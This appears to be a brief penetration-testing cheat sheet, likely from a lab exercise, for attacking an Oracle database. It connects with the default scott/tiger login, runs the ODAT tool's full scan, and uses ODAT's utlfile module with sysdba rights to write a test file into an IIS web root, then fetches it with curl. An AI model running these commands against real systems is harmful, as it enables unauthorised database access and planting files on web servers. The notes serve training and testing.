# Oracle Database connect
```
sqlplus scott/tiger@10.129.204.235/XE
```
# ODAT
### Test Oracle Database 
```
odat all -s 10.129.204.235
```
### Upload file to web server path 
```
echo "Oracle File Upload Test" > testing.txt
odat utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
curl -X GET http://10.129.204.235/testing.txt
```
